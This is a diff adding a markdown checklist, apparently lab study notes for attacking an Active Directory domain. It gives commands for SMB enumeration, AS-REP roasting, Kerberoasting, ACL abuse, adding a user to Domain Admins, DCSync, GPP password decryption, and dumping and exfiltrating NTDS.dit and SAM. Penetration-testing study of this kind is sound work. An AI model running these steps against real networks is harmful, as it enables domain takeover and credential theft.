@@ -1,0 +1,114 @@
+BloodHound Dump + Manual PowerView → SPNs? → Kerberoast
+BloodHound Dump + Manual PowerView → GenericAll/WriteOwner? → Abuse ACL
+BloodHound Dump + Manual PowerView → Replicate Directory Changes? → DCSync
+SYSVOL/Groups.xml pillaging → GPP Passwords? → Crack or Reuse
+Snaffler output? → Sensitive shares? → Cred reuse or privilege escalation
+
+
+
+### 🔓 SMB & RPC Enumeration
+
+- [ ] Attempt SMB null session: `smbclient -L //<target> -N`
+- [ ] Enumerate shares with valid creds: `smbclient -L //<target> -U <user>`
+- [ ] Check permissions with CrackMapExec:
+- [ ] `crackmapexec smb <target> -u <user> -p <pass> --shares`
+- [ ]  `crackmapexec smb <target> -u <user> -p <pass> --lsa`
+- [ ] List users via enum4linux or rpcclient
+- [ ] `rpcclient -U "" <target>`
+- [ ]  `rpcclient -U <user>%<pass> <target> -c enumdomusers`
+   - [ ] Attempt anonymous share access:
+- [ ] `smbclient -L //<target> -N`
+- [ ] Enumerate shares with valid creds:
+- [ ] `smbclient -L //<target> -U <user>`
+- [ ] Connect and browse a share:
+- [ ] `smbclient //<target>/<share> -U <user>`
+- [ ] In-shell: `recurse ON`, `ls`, `get`, `cd`, `prompt OFF`
+- [ ] Mount share (if needed):
+- [ ] `sudo mount -t cifs //<target>/<share> /mnt/smb -o user=<user>,pass=<pass>`
+- [ ] Enumerate users with:
+- [ ] `enum4linux -a <target>`
+- [ ] `rpcclient -U "" <target>` or `-U <user>%<pass>`
+- [ ] Use CME for LSA and share review:
+- [ ] `crackmapexec smb <target> -u <user> -p <pass> --shares`
+- [ ] `crackmapexec smb <target> -u <user> -p <pass> --lsa`
+
+---
+
+### 🎯 AS-REP Roasting
+
+- [ ] Enumerate users with `DONTREQPREAUTH` flag:
+- [ ]  `Get-ASREPHash -Verbose`
+- [ ] or `rubeus asreproast`
+- [ ] Save hash to file: `Out-File asrep.hash`
+- [ ] Crack with Hashcat: `hashcat -m 18200 asrep.hash rockyou.txt`
+
+---
+
+### 🔥 Kerberoasting
+
+- [ ] Enumerate SPNs:
+- [ ]  `Get-DomainUser -SPN`
+  - [ ] or BloodHound: `GetUserSPNs`
+- [ ] Request TGS tickets: `Get-DomainSPNTicket -Format Hashcat`
+- [ ] Save to file: `Out-File kerberoast.hash`
+- [ ] Crack with Hashcat: `hashcat -m 13100 kerberoast.hash rockyou.txt`
+
+---
+
+### 🔐 Privilege Escalation via ACL Abuse
+
+- [ ] BloodHound: Upload `.json` → Identify `GenericWrite`/`GenericAll` paths
+- [ ] Confirm ACL rights manually with PowerView:
+  - `Find-ObjectAcl -ResolveGUIDs`
+- [ ] Abuse `GenericWrite` on user:
+  - Set SPN: `setspn -s http/fake ttimmons`
+  - Dump ticket: `Get-DomainSPNTicket`
+- [ ] Crack → Get creds → escalate user or group membership
+
+---
+
+### 🧬 Group Membership & Token Abuse
+
+- [ ] Check group memberships:
+  - `Get-DomainGroupMember -Identity 'Domain Admins'`
+  - `net group "Domain Admins" /domain`
+- [ ] Add yourself or controlled user to DA:
+  - `net group "Domain Admins" <user> /add /domain`
+
+---
+
+### 🧠 DCSync & Domain Takeover
+
+- [ ] BloodHound: `Find Users With DCSync Rights`
+- [ ] Confirm with PowerView:
+  - `Get-ObjectAcl -SamAccountName <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "Replicating"}`
+- [ ] Execute DCSync:
+  - `secretsdump.py <user>:<pass>@<DC>`
+- [ ] Extract `Administrator` NTLM hash
+
+---
+
+### 🧪 Trust Abuse / Delegation
+
+- [ ] Enumerate unconstrained delegation: `Get-DomainComputer -Unconstrained`
+- [ ] Look for resource-based constrained delegation:
+  - `Get-DomainObjectAcl -SearchBase 'OU=Servers,...'`
+- [ ] Abuse with `Rubeus tgtdeleg` or `Powermad + Rubeus`
+
+---
+
+### 📁 SYSVOL & GPP Hunting
+
+- [ ] Check for GPP cpasswords:
+  - `\\<DC>\SYSVOL\inlanefreight.local\Policies\...\Groups.xml`
+- [ ] Decrypt cpassword: `gpp-decrypt <cpassword>`
+
+---
+
+### 💣 Final Pillaging
+
+- [ ] `evil-winrm` or `wmiexec` to DA box
+- [ ] Dump creds:
+- [ ]  `mimikatz`, `LaZagne`, `secretsdump.py`
+- [ ] Exfil: `NTDS.dit`, `SYSTEM`, `SAM`, `SECURITY`
+
